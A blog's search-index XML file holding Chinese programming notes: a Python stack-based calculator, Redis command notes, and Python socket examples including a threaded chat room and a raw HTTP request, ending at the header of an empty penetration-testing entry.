<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python实现计算器</title>
      <link href="/2019/08/15/python-shi-xian-jian-dan-de-si-ze-yun-suan-ji-suan-qi/"/>
      <url>/2019/08/15/python-shi-xian-jian-dan-de-si-ze-yun-suan-ji-suan-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="用python实现一个简单的计算器"><a href="#用python实现一个简单的计算器" class="headerlink" title="用python实现一个简单的计算器"></a>用python实现一个简单的计算器</h1><p>学c的时候最后要做一个可以有优先级运算的计算器，当时没做出来，而且c也不学了，但是还是想写一个弥补遗憾，</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">get_list</span><span class="token punctuation">(</span>calc_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    用来分割数字和运算符    '''</span>    calc_str <span class="token operator">=</span> re<span class="token punctuation">.</span>split<span class="token punctuation">(</span>r<span class="token string">"(\D)"</span><span class="token punctuation">,</span>calc_str<span class="token punctuation">)</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> value <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>calc_str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            calc_str<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token keyword">return</span> calc_str<span class="token keyword">def</span> <span class="token function">is_number</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> item<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">priority</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> now<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    规则， 判断是入栈还是计算    push 入符号栈    calc 计算后入数字栈    bihe 去括号    '''</span>    level1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"-"</span><span class="token punctuation">]</span>    level2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">]</span>    level3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"("</span><span class="token punctuation">]</span>    level4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">")"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> top <span class="token keyword">in</span> level1<span class="token punctuation">:</span>        <span class="token keyword">if</span> now <span class="token keyword">in</span> level2 <span class="token operator">or</span> now <span class="token keyword">in</span> level3<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"push"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"calc"</span>    <span class="token keyword">elif</span> top <span class="token keyword">in</span> level2<span class="token punctuation">:</span>        <span class="token keyword">if</span> now <span class="token keyword">in</span> level3<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"push"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"calc"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> now <span class="token keyword">in</span> level4<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"bihe"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"push"</span><span class="token keyword">def</span> <span class="token function">calculale</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span>symbol<span class="token punctuation">,</span>num2<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> str<span class="token punctuation">(</span>num1<span class="token punctuation">)</span> <span class="token operator">+</span> symbol <span class="token operator">+</span> str<span class="token punctuation">(</span>num2<span class="token punctuation">)</span>    <span class="token keyword">return</span> eval<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pop_append_stack</span><span class="token punctuation">(</span>number_stack<span class="token punctuation">,</span> symbol_stack<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    用来求和后入栈    num2, num1 数字栈顶两个 num2后入栈的所以 num1 +-*/ num2    calc_symbol 栈顶运算    '''</span>    num2 <span class="token operator">=</span> number_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    num1 <span class="token operator">=</span> number_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    calc_symbol <span class="token operator">=</span> symbol_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    number_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>calculale<span class="token punctuation">(</span>num1<span class="token punctuation">,</span> calc_symbol<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    calc <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入你的式子:如1*2+(3*4)/2"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span><span class="token string">"====>  "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>calc<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入正确的式子"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    calc_list <span class="token operator">=</span> get_list<span class="token punctuation">(</span>calc<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#用列表来模拟栈 一个存运算符一个存数字</span>    number_stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    symbol_stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> now <span class="token keyword">in</span> calc_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> is_number<span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">:</span>            number_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>now<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token operator">not</span> symbol_stack<span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 如果栈顶为空 直接入栈</span>                    symbol_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>now<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                top <span class="token operator">=</span> symbol_stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                symbol <span class="token operator">=</span> priority<span class="token punctuation">(</span>top<span class="token punctuation">,</span> now<span class="token punctuation">)</span>                <span class="token keyword">if</span> symbol <span class="token operator">==</span> <span class="token string">"push"</span><span class="token punctuation">:</span>                    symbol_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>now<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">elif</span> symbol <span class="token operator">==</span> <span class="token string">"calc"</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#求和后重新计算</span>                    pop_append_stack<span class="token punctuation">(</span>number_stack<span class="token punctuation">,</span> symbol_stack<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#如果是遇到 ) 则弹出 (</span>                    symbol_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>symbol_stack<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#如果最后栈底是+ - 栈顶是* / 会少计算一位这里做判断</span>            pop_append_stack<span class="token punctuation">(</span>number_stack<span class="token punctuation">,</span> symbol_stack<span class="token punctuation">)</span>        pop_append_stack<span class="token punctuation">(</span>number_stack<span class="token punctuation">,</span> symbol_stack<span class="token punctuation">)</span>    result <span class="token operator">=</span> number_stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"结果为  "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis学习笔记</title>
      <link href="/2019/07/28/redis/"/>
      <url>/2019/07/28/redis/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="Redis常用操作"><a href="#Redis常用操作" class="headerlink" title="Redis常用操作"></a>Redis常用操作</h2><ol><li>set – 设置值 set name ding</li><li>get – 获取值 get name</li><li>mset – 设置多个值 set name ding age 18</li><li>mget – 获取多个值 mget name age</li><li>append – 添加字符串 append name “123”  # ding123</li><li>del – 删除 del name</li><li>incr/decr – 增加/减少1 incr age</li></ol><h2 id="Redis-list操作"><a href="#Redis-list操作" class="headerlink" title="Redis list操作"></a>Redis list操作</h2><ol><li>lpush/rpush – 从左/右插入数据 lpush list 1 2 3 4 5</li><li>lrange – 获取指定长度的数据 lrange list 0 -1 # 可以像python一样用0 -1表示获取全部</li><li>ltrim – 截取一定长度的list ltrim list 1 -1 # 删除第一个元素，保留第二个到最后一个元素</li><li>lpushx/rpushx – 从左/右插入数据，如果key不存在则不创建 #如lpush list1 会创建新的list，lpushx不会，也不会报错</li><li>lpop/rpop –移除最左/最右的数据</li></ol><h2 id="Redis-set操作"><a href="#Redis-set操作" class="headerlink" title="Redis set操作"></a>Redis set操作</h2><ol><li>sadd/srem – 添加/删除集合元素</li><li>sismember – 判断是否为集合的一个元素</li><li>smembers – 返回集合所有成员</li><li>sdiff – 返回一个集合和其他集合的差集</li><li>sinter – 返回几个集合的交集</li><li>sunion – 返回几个集合的并集</li></ol><h2 id="Redis-hash操作"><a href="#Redis-hash操作" class="headerlink" title="Redis hash操作"></a>Redis hash操作</h2><ol><li>hset/hget – 设置/获取hash值 hset new:1 title “title1”</li><li>hmset/hmget – 设置/获取多条hash值 hmset new:1 title “title1” content “content1”</li><li>hsetnx –  如果hash已经存在则不设置 hsetnx new:1 title “new title”</li><li>hkeys/hvals – 返回所有keys/values hkeys new:1</li><li>hlen – 返回hash包含域（field）的数量 hlen new:1</li><li>hdel – 删除hash制定的域（field）hdel new:1 title</li><li>hexists – 判断是否存在 hexists new:1 title</li></ol><h2 id="python连接Redis"><a href="#python连接Redis" class="headerlink" title="python连接Redis"></a>python连接Redis</h2><p>安装python连接Redis的包</p><pre class=" language-python"><code class="language-python">pip install redis</code></pre><p>连接redis</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> redisr <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.12.153'</span><span class="token punctuation">,</span>decode_responses<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#decode_responses将返回解码,其他的参数用的默认</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket编程学习笔记</title>
      <link href="/2019/07/27/socket-bian-cheng/"/>
      <url>/2019/07/27/socket-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Socket编程"><a href="#Python-Socket编程" class="headerlink" title="Python Socket编程"></a>Python Socket编程</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://mail.ding0x0.top/socket.jpg" alt="1"></p><p>创建socket server</p><ol><li>创建<code>socket</code>套接字</li><li>绑定地址和端口</li><li>监听客户端的<code>socket</code>请求</li><li>阻塞直到收到连接请求</li></ol><p>创建socket client</p><ol><li>创建<code>socket</code>套接字</li><li>连接<code>socket</code>服务器</li></ol><h2 id="使用socket进行通讯"><a href="#使用socket进行通讯" class="headerlink" title="使用socket进行通讯"></a>使用socket进行通讯</h2><p>server</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketserver <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#最大链接数</span>sock<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#接收返回</span>data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3中返回的是bytes类型需要转换类型输出</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>client</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketclient <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"client"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="使用socket实现简单的在线聊天室"><a href="#使用socket实现简单的在线聊天室" class="headerlink" title="使用socket实现简单的在线聊天室"></a>使用socket实现简单的在线聊天室</h2><p>效果图<br><img src="https://mail.ding0x0.top/socket1.png" alt="2"></p><p><img src="https://mail.ding0x0.top/socket2.png" alt="3"></p><p>server</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadingserver <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>user_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>user_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">tell_all_user</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    current_sock <span class="token operator">=</span> sock<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> u <span class="token keyword">in</span> user_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> u<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> current_sock<span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 除了当前的sock，向其他的sock链接分发消息</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                u<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> <span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">create_user_thread</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>    current_sock <span class="token operator">=</span> sock<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>    nickname <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>    user_dict<span class="token punctuation">[</span>current_sock<span class="token punctuation">]</span> <span class="token operator">=</span> nickname    user_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> current_sock<span class="token punctuation">,</span> <span class="token string">' has nickname :'</span><span class="token punctuation">,</span> nickname<span class="token punctuation">)</span>    tell_all_user<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token string">"【系统提示】用户"</span><span class="token operator">+</span>nickname<span class="token operator">+</span><span class="token string">"进入聊天室"</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            msg <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> msg<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">"："</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span>                tell_all_user<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> nickname <span class="token operator">+</span> <span class="token string">"："</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">:</span>            user_list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>            tell_all_user<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token string">"【系统提示】用户"</span><span class="token operator">+</span>nickname<span class="token operator">+</span><span class="token string">"退出聊天室"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>nickname<span class="token punctuation">,</span> <span class="token string">'exit, '</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>user_list<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' person left'</span><span class="token punctuation">)</span>            sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    sock<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Accept a new connection'</span><span class="token punctuation">,</span> sock<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sock<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"welcome to server!"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>create_user_thread<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span></code></pre><p>clinet</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadingclient <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>banner <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>nickname <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入你的昵称"</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>nickname<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">recv_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">pass</span>        <span class="token keyword">except</span> <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"server closed"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">send_dunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            msg <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"server closed"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>send_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_dunc<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>recv_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>recv_func<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>thread_list <span class="token operator">=</span> <span class="token punctuation">[</span>send_thread<span class="token punctuation">,</span> recv_thread<span class="token punctuation">]</span><span class="token keyword">for</span> thread <span class="token keyword">in</span> thread_list<span class="token punctuation">:</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="socket发送http请求"><a href="#socket发送http请求" class="headerlink" title="socket发送http请求"></a>socket发送http请求</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 引入urllib 只是为了解析url方便，也可以手写</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    host <span class="token operator">=</span> url<span class="token punctuation">.</span>netloc    path <span class="token operator">=</span> url<span class="token punctuation">.</span>path    <span class="token keyword">if</span> path <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> <span class="token string">"/"</span>    client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    reques_header <span class="token operator">=</span> <span class="token string">"GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">,</span> host<span class="token punctuation">)</span>    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>reques_header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> b<span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">:</span>            d <span class="token operator">+=</span> data        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    request<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-信息搜集</title>
      <link href="/2019/07/19/shen-tou-ce-shi-xin-xi-sou-ji/"/>
      <url>/2019/07/19/shen-tou-ce-shi-xin-xi-sou-ji/</url>
      
